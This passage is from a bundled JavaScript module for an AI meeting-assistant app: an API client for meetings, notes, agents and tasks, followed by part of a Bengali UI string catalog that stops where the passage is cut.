import { activeLocale, fmtTime, useAppApi, useImeGuard, useLanguageGeneration, useNavigate, useNotify } from "@kirocrew/app-sdk";
import * as React from "react";
import H, { Children, Component, Fragment, cloneElement, createContext, createElement, forwardRef, isValidElement, useCallback, useContext, useEffect, useId, useInsertionEffect, useLayoutEffect, useMemo, useRef, useState } from "react";
import { useMutation, useMutationState, useQuery, useQueryClient } from "@tanstack/react-query";
import { AlertTriangle, Archive, ArchiveRestore, ArrowDownToLine, ArrowLeft, ArrowRight, CalendarClock, CalendarPlus, CheckCheck, CircleCheck, CircleDot, ExternalLink, Eye, FileText, ImagePlus, Languages, ListChecks, Loader2, Maximize2, MessageSquare, MessageSquareText, Minimize2, MoreHorizontal, NotebookPen, Paperclip, Pause, Pen, Pencil, Play, Plus, RefreshCw, RotateCcw, ScrollText, Send, Settings2, Sparkles, Square, Star, Trash2, Volume2, VolumeX, X } from "lucide-react";
import * as ui from "@kirocrew/app-sdk/ui";
import { Badge, Btn, Btn as Btn$1, Card, CardTitle, Clickable as ui_default$1, EmptyState, ErrorNotice as ui_default$2, Input, MarkdownRenderer as ui_default, Modal, PageHeader, SearchInput, SendBtn, Skeleton, StatCard, Toggle } from "@kirocrew/app-sdk/ui";
import { Fragment as Fragment$1, jsx, jsxs } from "react/jsx-runtime";
import ao from "react-dom";
// \0rolldown/runtime.js
var __defProp = Object.defineProperty;
var __getOwnPropDesc = Object.getOwnPropertyDescriptor;
var __getOwnPropNames = Object.getOwnPropertyNames;
var __hasOwnProp = Object.prototype.hasOwnProperty;
var __esmMin = (fn, res, err) => () => {
	if (err) throw err[0];
	try {
		return fn && (res = fn(fn = 0)), res;
	} catch (e) {
		throw err = [e], e;
	}
};
var __exportAll = (all, no_symbols) => {
	let target = {};
	for (var name in all) __defProp(target, name, {
		get: all[name],
		enumerable: true
	});
	if (!no_symbols) __defProp(target, Symbol.toStringTag, { value: "Module" });
	return target;
};
var __copyProps = (to, from, except, desc) => {
	if (from && typeof from === "object" || typeof from === "function") for (var keys = __getOwnPropNames(from), i = 0, n = keys.length, key; i < n; i++) {
		key = keys[i];
		if (!__hasOwnProp.call(to, key) && key !== except) __defProp(to, key, {
			get: ((k) => from[k]).bind(null, key),
			enumerable: !(desc = __getOwnPropDesc(from, key)) || desc.enumerable
		});
	}
	return to;
};
var __toCommonJS = (mod) => __hasOwnProp.call(mod, "module.exports") ? mod["module.exports"] : __copyProps(__defProp({}, "__esModule", { value: true }), mod);
// src/api.ts
var API = "/api/apps/meetings";
/** A stalled image upload must not keep the note's autosave gate closed forever. */
var NOTE_IMAGE_UPLOAD_TIMEOUT_MS = 6e4;
/**
* Full literal catalog keys per enum value, not a suffix interpolated at the call
* site: an assembled key exists nowhere in the source, so the extractor and the
* unused-key tooling cannot see it (`dynamicKeys.test.ts`).
*/
var PRIORITY_LABEL_KEY = {
	high: "apps.meetings.priority.high",
	medium: "apps.meetings.priority.medium",
	low: "apps.meetings.priority.low"
};
/** Full literal catalog keys per widget type — same reason as above. */
var WIDGET_TYPE_LABEL_KEY = {
	markdown: "apps.meetings.widgetType.markdown",
	html: "apps.meetings.widgetType.html",
	chat: "apps.meetings.widgetType.chat"
};
/** An error carrying the backend's status so callers can branch on 409/410/502. */
var MeetingsApiError = class extends Error {
	status;
	code;
	/** Human-readable title of the meeting blocking a 409 start, when the server supplied it. */
	blockingMeetingTitle;
	/** Status of the meeting blocking a 409 start ('active', 'reviewing', …), when supplied. */
	blockingMeetingStatus;
	constructor(message, status, code = "", context = {}) {
		super(message);
		this.name = "MeetingsApiError";
		this.status = status;
		this.code = code;
		this.blockingMeetingTitle = context.blocking_meeting_title ?? "";
		this.blockingMeetingStatus = context.blocking_meeting_status ?? "";
	}
};
function isScopedFailure(err) {
	return typeof err === "object" && err !== null && typeof err.status === "number" && typeof err.body === "string";
}
/** Before the root mounts (a module evaluated early, a test): a plain same-origin fetch. */
var sameOriginFetch = { async raw(path, init) {
	const res = await fetch(path, {
		credentials: "same-origin",
		...init
	});
	if (!res.ok) {
		const body = await res.text().catch(() => res.statusText);
		throw Object.assign(/* @__PURE__ */ new Error(`API ${res.status}`), {
			status: res.status,
			body,
			statusText: res.statusText
		});
	}
	return res;
} };
var transport = sameOriginFetch;
/** Route every call through *next* (the page root passes `useAppApi()`). */
function setTransport(next) {
	transport = next ?? sameOriginFetch;
}
function errorFrom(status, bodyText, statusText = "") {
	let detail = statusText || `HTTP ${status}`;
	let code = "";
	const context = {};
	try {
		const body = JSON.parse(bodyText);
		if (body?.error) detail = String(body.error);
		if (body?.code) code = String(body.code);
		if (typeof body?.blocking_meeting_title === "string" || typeof body?.blocking_meeting_status === "string") {
			context.blocking_meeting_title = typeof body.blocking_meeting_title === "string" ? body.blocking_meeting_title : "";
			context.blocking_meeting_status = typeof body.blocking_meeting_status === "string" ? body.blocking_meeting_status : "";
		}
	} catch {}
	return new MeetingsApiError(detail, status, code, context);
}
async function request(path, init) {
	const isMultipart = typeof FormData !== "undefined" && init?.body instanceof FormData;
	const headers = init?.body && !isMultipart ? {
		"Content-Type": "application/json",
		...init?.headers
	} : init?.headers;
	let res;
	try {
		res = await transport.raw(`${API}${path}`, {
			...init,
			headers
		});
	} catch (err) {
		if (isScopedFailure(err)) throw errorFrom(err.status, err.body, err.statusText);
		throw err;
	}
	if (!res.ok) {
		const text = await res.text().catch(() => "");
		throw errorFrom(res.status, text, res.statusText);
	}
	if (res.status === 204) return void 0;
	const text = await res.text();
	return text.trim() === "" ? void 0 : JSON.parse(text);
}
var post = (path, body) => request(path, {
	method: "POST",
	body: body === void 0 ? void 0 : JSON.stringify(body)
});
var meetingsApi = {
	config: () => request("/settings"),
	saveConfig: (config) => request("/settings", {
		method: "PUT",
		body: JSON.stringify({ config })
	}),
	dictionary: () => request("/dictionary"),
	addTerm: (correct, aliases) => post("/dictionary", {
		correct,
		aliases
	}),
	removeTerm: (correct) => post("/dictionary/remove", { correct }),
	calendar: () => request("/calendar"),
	syncCalendar: () => post("/calendar/sync"),
	agents: () => request("/agents"),
	status: () => request("/status"),
	meetings: () => request("/meetings"),
	meeting: (id) => request(`/meetings/${encodeURIComponent(id)}`),
	renameMeeting: (id, title) => request(`/meetings/${encodeURIComponent(id)}`, {
		method: "PATCH",
		body: JSON.stringify({ title })
	}),
	deleteMeeting: (id) => request(`/meetings/${encodeURIComponent(id)}`, { method: "DELETE" }),
	init: (id, title) => post(`/meetings/${encodeURIComponent(id)}/init`, { title }),
	start: (id, body) => post(`/meetings/${encodeURIComponent(id)}/start`, body),
	setStatus: (id, status) => post(`/meetings/${encodeURIComponent(id)}/status`, { status }),
	stop: (id) => post(`/meetings/${encodeURIComponent(id)}/stop`),
	outputs: (id) => request(`/meetings/${encodeURIComponent(id)}/outputs`),
	/**
	* Save the user's edit of one agent's output.
	*
	* Stored as a sidecar, so the agent keeps writing its own file and `revertOutput`
	* restores the generated text by deleting one file.
	*/
	saveOutput: (id, agentId, content) => request(`/meetings/${encodeURIComponent(id)}/outputs`, {
		method: "PUT",
		body: JSON.stringify({
			agent_id: agentId,
			content
		})
	}),
	/** Discard the user's edit, so the agent's own output is shown again. */
	revertOutput: (id, agentId) => request(`/meetings/${encodeURIComponent(id)}/outputs`, {
		method: "DELETE",
		body: JSON.stringify({ agent_id: agentId })
	}),
	transcript: (id, cursor = 0) => request(`/meetings/${encodeURIComponent(id)}/transcript${cursor ? `?cursor=${cursor}` : ""}`),
	note: (id) => request(`/meetings/${encodeURIComponent(id)}/note`),
	/**
	* Store one pasted image and get back the markdown pieces to insert.
	*
	* `FormData`, so no `Content-Type` header is set by hand — the browser has to
	* supply the multipart boundary, and setting the header manually omits it.
	*/
	uploadNoteImage: async (id, file) => {
		const body = new FormData();
		body.append("file", file);
		const controller = new AbortController();
		const timeout = setTimeout(() => controller.abort(), NOTE_IMAGE_UPLOAD_TIMEOUT_MS);
		try {
			return await request(`/meetings/${encodeURIComponent(id)}/note/images`, {
				method: "POST",
				body,
				signal: controller.signal
			});
		} finally {
			clearTimeout(timeout);
		}
	},
	/**
	* `keepalive` lets the tab-close save outlive its page, and only that save asks
	* for it: a plain fetch dies with the document. The browser caps the bodies of
	* ALL outstanding keepalive requests together at 64 KiB, so an ordinary autosave
	* still on the wire with keepalive would use up the room the tab-close save needs
	* and the browser would refuse it. A body over the cap is sent as a plain fetch,
	* since a keepalive request that large is refused outright.
	*/
	saveNote: (id, content, { keepalive = false, order } = {}) => {
		const body = JSON.stringify(order ? {
			content,
			editor: order.editor,
			seq: order.seq
		} : { content });
		return request(`/meetings/${encodeURIComponent(id)}/note`, {
			method: "PUT",
			body,
			keepalive: keepalive && new TextEncoder().encode(body).byteLength <= 65536
		});
	},
	/**
	* Translated lines newer than `since`. Cursor-based rather than full-document:
	* the panel polls while it is open and a long meeting accumulates hundreds of
	* lines, so resending all of them each time would grow linearly for no gain.
	*/
	translations: (id, since = 0) => request(`/meetings/${encodeURIComponent(id)}/translations?since=${encodeURIComponent(String(since))}`),
	attachments: (id, body) => post(`/meetings/${encodeURIComponent(id)}/attachments`, body),
	toggleAgent: (id, agentId, enable) => post(`/meetings/${encodeURIComponent(id)}/agents`, {
		agent_id: agentId,
		enable
	}),
	mute: (id, agentId, muted) => post(`/meetings/${encodeURIComponent(id)}/mute`, {
		agent_id: agentId,
		muted
	}),
	dispatch: (id, text, chat = false) => post(`/meetings/${encodeURIComponent(id)}/dispatch`, {
		text,
		chat
	}),
	message: (id, agentId, text) => post(`/meetings/${encodeURIComponent(id)}/message`, {
		agent_id: agentId,
		text
	}),
	resetAgents: (id) => post(`/meetings/${encodeURIComponent(id)}/reset`),
	tasks: (id) => request(`/meetings/${encodeURIComponent(id)}/tasks`),
	addTask: (id, description) => post(`/meetings/${encodeURIComponent(id)}/tasks`, { description }),
	updateTask: (id, taskId, fields) => request(`/meetings/${encodeURIComponent(id)}/tasks`, {
		method: "PATCH",
		body: JSON.stringify({
			id: taskId,
			fields
		})
	}),
	deleteTask: (id, taskId) => request(`/meetings/${encodeURIComponent(id)}/tasks`, {
		method: "DELETE",
		body: JSON.stringify({ id: taskId })
	}),
	fileTask: (id, taskId) => post(`/meetings/${encodeURIComponent(id)}/tasks/file`, { id: taskId }),
	reviewTask: (id, taskId, reviewStatus) => post(`/meetings/${encodeURIComponent(id)}/tasks/review`, {
		id: taskId,
		review_status: reviewStatus
	}),
	taskProviders: () => request("/task-providers")
};
/** A calendar event id becomes a path segment, so it is normalized the same way
*  the backend's `safe_meeting_id` does. Kept here (not inlined) so the client
*  and the server agree on one rule. */
function safeMeetingId(eventId) {
	return eventId.replace(/:/g, "_");
}
// src/i18n.ts
/**
* The app's own strings. A bundle cannot read the dashboard's catalogs (those
* belong to the host and change with it), so every locale the dashboard ships is
* bundled here and looked up against the host's active language.
*
* The catalogs (`ui/i18n/<locale>.json`) are the `apps.meetings.*` subtree copied
* from Kiro Crew's dashboard catalogs (with `en.manual.json`'s additions in
* English), plus the confirm dialog's Cancel, under the SAME key paths, so every
* call site reads as it did in the built-in.
*
* Lookup order: the exact locale (`pt`, `zh-CN`), then its base language, then
* English, then the key itself. A numeric `count` selects the plural form the
* locale's rules name (`_one`, `_few`, `_many`, `_other`), as the dashboard's own
* catalogs are keyed. `{{name}}` placeholders are filled from `vars`; one with no
* value is left as written.
*
* `t` reads the language at call time. The root component subscribes to the
* host's language changes (`useLanguageGeneration`), and its re-render reaches
* every child, so a language switch repaints the page without a reload.
*/
var CATALOGS = {
	bn: {
		apps: /* @__PURE__ */ JSON.parse("{\"meetings\":{\"agentPanel\":{\"awaitingOutput\":\"{{name}}-এর আউটপুট এখানে দেখা যাবে।\",\"cancel\":\"বাতিল\",\"chatEmpty\":\"{{name}}-কে এখনও কিছু পাঠানো হয়নি।\",\"collapse\":\"{{name}} আগের পাশাপাশি বিন্যাসে ফেরাও\",\"diagramFrameTitle\":\"{{name}}-এর চিত্র\",\"discardDraft\":\"অসংরক্ষিত পরিবর্তন বাতিল করুন\",\"discardDraftHint\":\"অসংরক্ষিত পরিবর্তনগুলি স্থায়ীভাবে মুছে যাবে।\",\"edit\":\"এই আউটপুট সম্পাদনা করুন\",\"edited\":\"সম্পাদিত\",\"editorLabel\":\"{{name}}-এর আউটপুট, সম্পাদনাযোগ্য\",\"expand\":\"{{name}} বড় করো\",\"listeningHint\":\"মিটিং শুনছে\",\"messagePlaceholder\":\"{{name}}-কে বার্তা…\",\"mute\":\"{{name}}-কে নিঃশব্দ করুন\",\"mutedHint\":\"মিটিং শুনছে না\",\"revert\":\"আমার সম্পাদনা বাদ দিন\",\"revertHint\":\"আমার সম্পাদনা স্থায়ীভাবে মুছে {{name}} যা লিখেছে তা দেখান\",\"save\":\"সংরক্ষণ করুন\",\"saving\":\"সংরক্ষণ করা হচ্ছে…\",\"send\":\"পাঠান\",\"showChat\":\"চ্যাট দেখান\",\"showOutput\":\"আউটপুট দেখান\",\"staleEdit\":\"আপনি এটি সম্পাদনা করার পর {{name}} আরও লিখেছে। আপনার সংস্করণ দেখানো হচ্ছে; ওর সংস্করণ দেখতে নিজের সম্পাদনা বাদ দিন।\",\"unmute\":\"{{name}}-এর নিঃশব্দ তুলে দিন\"},\"broadcastBar\":{\"heard\":\"শোনা গেল: {{text}}\",\"pausedPlaceholder\":\"এজেন্ট বিরতিতে — পাঠাতে আবার শুরু করুন\",\"pausingPlaceholder\":\"বিরতি দেওয়া হচ্ছে — পাঠানো বন্ধ আছে\",\"placeholder\":\"শুনছে এমন সব এজেন্টকে কিছু বলুন…\",\"resumingPlaceholder\":\"আবার শুরু হচ্ছে — শীঘ্রই পাঠানো যাবে\",\"send\":\"পাঠান\"},\"list\":{\"adHocTitle\":\"তাৎক্ষণিক মিটিং\",\"deleteConfirm\":\"“{{title}}” এবং এর সব নোট, চিত্র ও করণীয় স্থায়ীভাবে মুছবেন? এটি আর ফেরানো যাবে না।\",\"deleteFailed\":\"এই মিটিংটি মোছা যায়নি।\",\"deleteMeeting\":\"{{title}} মুছুন\",\"deleteUnavailable\":\"মোছার আগে এই মিটিংটি শেষ করুন\",\"deleted\":\"“{{title}}” মোছা হয়েছে\",\"empty\":\"কোনও মিটিং নেই\",\"emptyHintNoCalendar\":\"সেটিংসে একটি ক্যালেন্ডার জুড়ুন, বা একটি তাৎক্ষণিক মিটিং শুরু করুন।\",\"emptyHintSynced\":\"ক্যালেন্ডারে কিছু নেই, আর এখনও কোনও মিটিং নিয়ে কাজ হয়নি।\",\"filterPlaceholder\":\"মিটিং ছাঁকুন…\",\"hasNotes\":\"নোট আছে\",\"liveBanner\":\"{{title}} চলছে\",\"newMeeting\":\"নতুন মিটিং\",\"returnToMeeting\":\"মিটিংয়ে ফিরুন\",\"reviewing\":\"পর্যালোচনায়\",\"reviewingBanner\":\"{{title}} করণীয় পর্যালোচনার অপেক্ষায়\",\"sectionTitle\":\"সব মিটিং\",\"settings\":\"সেটিংস\",\"statLive\":\"চলছে\",\"statScheduled\":\"নির্ধারিত\",\"statWorked\":\"কাজ হয়েছে\",\"subtitle\":\"মিটিং চলাকালীনই নোট, চিত্র আর করণীয়\",\"syncCalendar\":\"ক্যালেন্ডার সিঙ্ক করুন\",\"syncFailed\":\"ক্যালেন্ডার সিঙ্ক করা গেল না।\",\"synced_one\":\"{{count}}টি ইভেন্ট সিঙ্ক হয়েছে\",\"synced_other\":\"{{count}}টি ইভেন্ট সিঙ্ক হয়েছে\",\"title\":\"মিটিং\"},\"manifest\":{\"configuration_1\":\"লাইভ capture-এর জন্য browser-কে microphone permission দিন; চাইলে Settings-এ iCalendar path বা URL, local task ledger, agent role ও speech-correction term ঠিক করুন।\",\"description\":\"একটি AI মিটিং সহকারী। চলতি মিটিং প্রতিলিপি করে, সঙ্গে সঙ্গে সাজানো নোট ও ডায়াগ্রাম রাখে, করণীয় বের করে আনে, আর জমা দেওয়ার আগে সেগুলো তোমাকে দেখে নিতে দেয়।\",\"display_name\":\"মিটিং\",\"highlight_1\":\"Kiro Crew-এর নিজস্ব স্পিচ-টু-টেক্সট দিয়ে লাইভ প্রতিলিপিকরণ — বাড়তি কোনো ডিমন নেই, তুমি যা ব্যবহার করছ তার বাইরে কোনো ক্লাউড অ্যাকাউন্টও নেই\",\"highlight_2\":\"এজেন্টদের একটি দল একসঙ্গে মিটিং সামলায়: সাজানো নোট, একটি HTML/Mermaid ডায়াগ্রাম, আর করণীয়ের তালিকা\",\"highlight_3\":\"একটি ডোমেইন অভিধানে বারবার হওয়া স্পিচ-টু-টেক্সট ভুল একবার ঠিক করে দাও, পরের সব মিটিংয়ে সেগুলো ঠিকই আসবে\",\"highlight_4\":\"কিছু জমা হওয়ার আগেই বের করা করণীয়গুলো দেখে নাও — অপ্রয়োজনীয়গুলো আর্কাইভ করো, বাকিগুলো জমা দাও\",\"highlight_5\":\"টাস্ক ও ক্যালেন্ডার প্রোভাইডার বদলে নেওয়া যায়: সঙ্গে আসে একটি লোকাল টাস্ক লেজার আর একটি iCalendar (.ics) রিডার, আর কোনো প্রতিষ্ঠান নিজেরটাও নিবন্ধন করতে পারে\",\"highlight_6\":\"মিটিং চলার সময় প্রতিলিপিটা লাইন ধরে ধরে অন্য ভাষায় পড়ো\",\"highlight_7\":\"এজেন্টদের নোটের পাশে নিজের নোটও রাখো — স্ক্রিনশট পেস্ট করলে সেটা মিটিংয়ের অতিবাহিত সময়সহ যুক্ত হয়\",\"page_label\":\"মিটিং\",\"use_case_1\":\"লাইভ meeting record করুন, যখন সমান্তরাল agent transcript, structured note, diagram ও পর্যালোচনাযোগ্য action item তৈরি করে।\"},\"meeting\":{\"agentsPaused\":\"বারবার ব্যর্থ হওয়ার পর এজেন্টগুলি থেমে গেছে।\",\"attachPrompt\":\"এজেন্টদের সঙ্গে শেয়ার করার লিঙ্ক পেস্ট করুন\",\"back\":\"পিছনে\",\"endAndReview\":\"শেষ করে পর্যালোচনা করুন\",\"ended\":\"শেষ হয়েছে\",\"endingReview\":\"শেষ হচ্ছে — রিভিউ প্রস্তুত হচ্ছে…\",\"live\":\"চলছে\",\"loadFailed\":\"এই মিটিংটি খোলা গেল না\",\"moreActions\":\"আরও অ্যাকশন\",\"noAgents\":\"কোনও এজেন্ট চালু নেই\",\"noAgentsHint\":\"উপরের বার থেকে একটি চালু করুন, বা কোনও প্রিসেট বেছে নিন।\",\"pause\":\"থামান\",\"paused\":\"থামানো\",\"pausing\":\"থামানো হচ্ছে…\",\"refresh\":\"রিফ্রেশ করুন\",\"restart\":\"আবার শুরু করুন\",\"resuming\":\"চালিয়ে যাওয়া হচ্ছে…\",\"retryAgents\":\"আবার চেষ্টা করুন\",\"start\":\"শুরু করুন\",\"titleLabel\":\"মিটিংয়ের শিরোনাম\",\"toggleNote\":\"আমার নোট\",\"toggleTasks\":\"করণীয়\",\"toggleTranslation\":\"অনুবাদ\",\"unpause\":\"চালিয়ে যান\"},\"note\":{\"close\":\"নোট বন্ধ করো\",\"edit\":\"সম্পাদনা\",\"editorLabel\":\"নোটের লেখা\",\"hint\":\"লেখার সঙ্গে সঙ্গেই নিজে থেকে সংরক্ষণ হয়।\",\"loadFailed\":\"তোমার নোট ডিস্ক থেকে পড়া গেল না। কিছু যেন মুছে না যায়, তাই সম্পাদনা আপাতত বন্ধ — আবার চেষ্টা করতে প্যানেলটা বন্ধ করে আবার খোলো।\",\"loading\":\"তোমার নোট লোড হচ্ছে…\",\"paused\":\"সম্পাদনা আপাতত বন্ধ\",\"placeholder\":\"নিজের নোট এখানে লেখো। Markdown চলে।\",\"preview\":\"প্রিভিউ\",\"saved\":\"সংরক্ষিত\",\"saving\":\"সংরক্ষণ হচ্ছে…\",\"title\":\"আমার নোট\",\"unsaved\":\"অসংরক্ষিত পরিবর্তন\",\"uploading\":\"ছবি যোগ করা হচ্ছে…\"},\"pillBar\":{\"addLink\":\"লিংক যোগ করুন\",\"agentMuted\":\"{{name}} শুনছে না\",\"attachmentsMenu\":\"সংযুক্তি\",\"createPreset\":\"প্রিসেট তৈরি করুন\",\"disableAgent\":\"{{name}}-কে বন্ধ করুন\",\"enableAgent\":\"{{name}}-কে চালু করুন\",\"listening\":\"শুনছে\",\"manageAgents\":\"এজেন্ট ব্যবস্থাপনা\",\"manageAttachments\":\"সংযুক্তি ব্যবস্থাপনা\",\"noAttachments\":\"কোনও সংযুক্তি নেই\",\"noPreset\":\"কোনও প্রিসেট নয়\",\"presetDefaultOption\":\"{{name}} (ডিফল্ট)\",\"presetLabel\":\"এজেন্ট প্রিসেট\",\"removeAttachment\":\"{{label}} সরান\",\"usingDefaultPreset\":\"ডিফল্ট প্রিসেট ব্যবহার হচ্ছে\"},\"priority\":{\"high\":\"উচ্চ\",\"low\":\"নিম্ন\",\"medium\":\"মধ্যম\"},\"review\":{\"allDone\":\"সব পর্যালোচিত\",\"archive\":\"সংরক্ষণাগারে\",\"archiveAll\":\"বাকিগুলি সংরক্ষণাগারে\",\"archiveOthers_one\":\"অন্য {{count}}টি সংরক্ষণাগারে\",\"archiveOthers_other\":\"অন্য {{count}}টি সংরক্ষণাগারে\",\"archiveSkipsFiling\":\"ফাইল হচ্ছে এমন আইটেম বাদ থাকে\",\"archivedSection\":\"সংরক্ষণাগারে\",\"assignedTo\":\"{{name}}-কে দেওয়া হয়েছে\",\"backToMeeting\":\"মিটিংয়ে ফিরুন\",\"closeBlocked_one\":\"{{count}}টির সিদ্ধান্ত এখনও বাকি\",\"closeBlocked_other\":\"{{count}}টির সিদ্ধান্ত এখনও বাকি\",\"closeMeeting\":\"মিটিং বন্ধ করুন\",\"file\":\"নথিবদ্ধ করুন\",\"filedSection\":\"{{provider}}-এ নথিবদ্ধ\",\"filing\":\"নথিবদ্ধ হচ্ছে…\",\"nothingPending\":\"পর্যালোচনার আর কিছু নেই\",\"nothingPendingHint\":\"প্রতিটি করণীয় নথিবদ্ধ বা সংরক্ষণাগারে চলে গেছে।\",\"pendingSection\":\"অপেক্ষমাণ\",\"remaining_one\":\"{{count}}টি পর্যালোচনা বাকি\",\"remaining_other\":\"{{count}}টি পর্যালোচনা বাকি\",\"statArchived\":\"সংরক্ষণাগারে\",\"statFiled\":\"নথিবদ্ধ\",\"statPending\":\"অপেক্ষমাণ\",\"title\":\"করণীয় পর্যালোচনা\",\"unarchive\":\"ফিরিয়ে আনুন\"},\"session\":{\"agentToggleFailed\":\"সেই এজেন্টটি বদলানো গেল না।\",\"agentsResumed\":\"এজেন্টগুলি আবার চলছে।\",\"anotherMeetingActive\":\"আর একটি মিটিং ইতিমধ্যেই চলছে। আগে সেটি শেষ করুন।\",\"anotherMeetingActiveNamed\":\"“{{title}}” এখনও চলছে। মিটিং-এ সেটি খোলো এবং আগে সেটি শেষ করো।\",\"anotherMeetingReviewing\":\"“{{title}}” এখনও পর্যালোচনায় আছে। মিটিং-এ সেটি খোলো এবং আগে মিটিংটি বন্ধ করো।\",\"attachmentFailed\":\"সংযুক্তি হালনাগাদ করা গেল না।\",\"broadcastFailed\":\"এজেন্টদের কাছে পৌঁছানো গেল না।\",\"broadcastSent\":\"শুনছে এমন এজেন্টদের পাঠানো হয়েছে।\",\"ended\":\"মিটিং শেষ হয়েছে।\",\"messageFailed\":\"সেই বার্তাটি পাঠানো গেল না।\",\"minutesRevertFailed\":\"আপনার সম্পাদনা বাদ দেওয়া গেল না।\",\"minutesSaveFailed\":\"আপনার সম্পাদনা সংরক্ষণ করা গেল না।\",\"noteImageFailed\":\"সেই ছবিটি যোগ করা গেল না। PNG, JPEG, GIF বা WebP পেস্ট করো।\",\"noteImageTooLarge\":\"সেই ছবিটি নোটে যোগ করার জন্য অনেক বড়।\",\"noteSaveFailed\":\"তোমার নোট সংরক্ষণ করা গেল না।\",\"openVoiceSettings\":\"ভয়েস সেটিংস খোলো\",\"renameFailed\":\"মিটিংয়ের নাম বদলানো গেল না।\",\"startFailed\":\"মিটিং শুরু করা গেল না।\",\"started\":\"মিটিং শুরু হয়েছে।\",\"statusFailed\":\"মিটিংয়ের অবস্থা বদলানো গেল না।\",\"stopFailed\":\"মিটিং শেষ করা গেল না।\",\"sttConnectionFailed\":\"প্রতিলিপিকরণে সংযোগ করা গেল না।\",\"sttDisconnected\":\"প্রতিলিপিকরণের সংযোগ বিচ্ছিন্ন হয়েছে।\",\"sttDispatchFailed\":\"একটি ট্রান্সক্রিপ্ট অংশ এজেন্টদের কাছে পৌঁছানো যায়নি।\",\"sttMicDenied\":\"মাইক্রোফোনের অনুমতি দেওয়া হয়নি।\",\"sttStreamingDisabled\":\"লাইভ ট্রান্সক্রিপশন বন্ধ আছে। সেটিংস → ভয়েস-এ দেখো ভয়েস ইনপুট চালু আছে, প্রোভাইডার স্ট্রিমিং সমর্থন করে, এবং স্ট্রিমিং চালু আছে।\",\"sttUnavailable\":\"প্রতিলিপিকরণ পাওয়া যাচ্ছে না।\",\"sttUnsupported\":\"এই ব্রাউজার অডিও রেকর্ড করতে পারে না।\",\"sttWorkletFailed\":\"অডিও প্রসেসর চালু করা গেল না।\",\"taskAddFailed\":\"সেই করণীয়টি যোগ করা গেল না।\",\"taskFileFailed\":\"সেই করণীয়টি নথিবদ্ধ করা গেল না।\",\"taskFiled\":\"করণীয় নথিবদ্ধ হয়েছে।\",\"untitled\":\"শিরোনামহীন মিটিং\"},\"settings\":{\"addTerm\":\"যোগ করুন\",\"agentsHelp\":\"একটি মিটিংয়ে কোন এজেন্টগুলি থাকবে, আর তার মধ্যে কোনগুলি শুরুতেই চালু থাকবে।\",\"agentsTitle\":\"এজেন্ট\",\"aliasesLabel\":\"ভুল শোনা রূপ\",\"aliasesPlaceholder\":\"প্রতিলিপিকরণ যা শোনে, কমা দিয়ে আলাদা করে…\",\"back\":\"পিছনে\",\"calendarHelp\":\"আসন্ন মিটিং কোথা থেকে পড়া হয়।\",\"calendarProviderLabel\":\"ক্যালেন্ডার সরবরাহকারী\",\"calendarSourceHint\":\"স্থানীয় কোনও .ics ফাইলের পথ, বা তার দিকে যাওয়া একটি https URL।\",\"calendarSourceLabel\":\"ক্যালেন্ডারের উৎস\",\"calendarSourcePlaceholder\":\".ics ফাইলের পথ বা URL…\",\"calendarTitle\":\"ক্যালেন্ডার\",\"correctLabel\":\"সঠিক শব্দ\",\"correctPlaceholder\":\"যা লেখা উচিত…\",\"dictionaryHelp\":\"প্রতিলিপিকরণের একই ভুল একবার শুধরে দিন, তারপর প্রতিটি মিটিংয়ে সেটি ঠিক লেখা হবে।\",\"dictionaryTitle\":\"উচ্চারণ অভিধান\",\"enabledByDefault\":\"{{name}}-কে ডিফল্টে চালু রাখুন\",\"noTerms\":\"এখনও কোনও সংশোধন নেই\",\"noTermsHint\":\"বাঁ দিকে লিখুন প্রতিলিপিকরণ কী ভুল শোনে, আর ডান দিকে কী লেখা উচিত।\",\"removeTerm\":\"{{term}} সরান\",\"saveFailed\":\"সেটিংস সংরক্ষণ করা গেল না।\",\"saveSource\":\"সংরক্ষণ করুন\",\"saved\":\"সংরক্ষিত হয়েছে।\",\"subtitle\":\"সরবরাহকারী, এজেন্ট এবং উচ্চারণ অভিধান\",\"taskProviderHelp\":\"পর্যালোচিত করণীয় কোথায় নথিবদ্ধ হয়।\",\"taskProviderTitle\":\"কাজের সরবরাহকারী\",\"termFailed\":\"সেই সংশোধনটি যোগ করা গেল না।\",\"termIncomplete\":\"যা শোনা গেছে এবং যা লেখা উচিত, দুটিই লিখুন।\",\"title\":\"মিটিং সেটিংস\",\"translationHelp\":\"প্রতিটি কথিত লাইন অন্য ভাষায় অনুবাদ করে এবং মিটিং চলাকালীন পাশের প্যানেলে দেখায়। প্রতি লাইনে একটি মডেল কল লাগে, তাই এটি ডিফল্টভাবে বন্ধ থাকে।\",\"translationOff\":\"বন্ধ\",\"translationTitle\":\"লাইভ অনুবাদ\"},\"taskSidebar\":{\"add\":\"যোগ করুন\",\"assigneeLabel\":\"দায়িত্বপ্রাপ্ত\",\"close\":\"করণীয় বন্ধ করুন\",\"deleteTask\":\"এই করণীয়টি মুছুন\",\"descriptionLabel\":\"করণীয়\",\"empty\":\"এখনও কিছু বের করা হয়নি।\",\"filed\":\"নথিবদ্ধ\",\"heading_one\":\"{{count}}টি করণীয়\",\"heading_other\":\"{{count}}টি করণীয়\",\"priorityLabel\":\"প্রাধান্য\",\"quickAddPlaceholder\":\"করণীয় যোগ করুন…\",\"title\":\"করণীয়\",\"unassigned\":\"দায়িত্ব দেওয়া হয়নি\"},\"transcript\":{\"empty\":\"এখনও কোনো প্রতিলিপি নেই\",\"emptyHintLive\":\"মিটিং চলার সাথে সাথে চূড়ান্ত বক্তব্য এখানে দেখা যাবে।\",\"emptyHintPaused\":\"বিরতিতে — আবার শুরু করলে বক্তৃতা এখানে দেখা যাবে।\",\"emptyHintRecorded\":\"এই মিটিংয়ের জন্য কোনো প্রতিলিপি রেকর্ড করা হয়নি।\",\"full\":\"প্রতিলিপি পূর্ণ। নতুন বক্তব্য ও সম্প্রচার আর রেকর্ড করা হবে না বা এজেন্টদের কাছে পাঠানো হবে না।\",\"jumpToLatest\":\"সাম্প্রতিক অংশে যান\",\"live\":\"লাইভ\",\"regionLabel\":\"মিটিং প্রতিলিপি\",\"title\":\"প্রতিলিপি\",\"typed\":\"টাইপ করা\"},\"translation\":{\"close\":\"অনুবাদ বন্ধ করুন\",\"dropped\":\"গতি ধরে রাখতে কিছু লাইন বাদ দেওয়া হয়েছে।\",\"empty\":\"এখনও কিছু অনুবাদ হয়নি\",\"emptyHint\":\"কথা বলার সঙ্গে সঙ্গে লাইনগুলি এখানে আসবে।\",\"lineFailed\":\"এই লাইনটি অনুবাদ করা গেল না।\",\"loading\":\"লোড হচ্ছে…\",\"pending\":\"পিছিয়ে থাকা অংশ পূরণ 